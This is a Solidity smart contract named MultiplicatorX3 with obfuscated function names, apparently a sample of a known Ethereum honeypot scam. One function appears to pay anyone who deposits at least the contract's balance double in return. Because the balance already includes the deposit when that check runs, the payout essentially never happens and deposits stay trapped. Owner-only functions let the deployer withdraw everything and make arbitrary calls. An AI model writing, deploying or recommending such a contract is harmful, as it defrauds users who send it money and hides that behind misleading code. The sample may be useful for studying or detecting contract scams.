// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;

    function() public payable{}

    function _0x013b67()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0x77bc11,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0x77bc11.call.value(msg.value)(data);
    }

    function _0xecd8be(address _0x77bc11)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            _0x77bc11.transfer(this.balance+msg.value);
        }
    }
}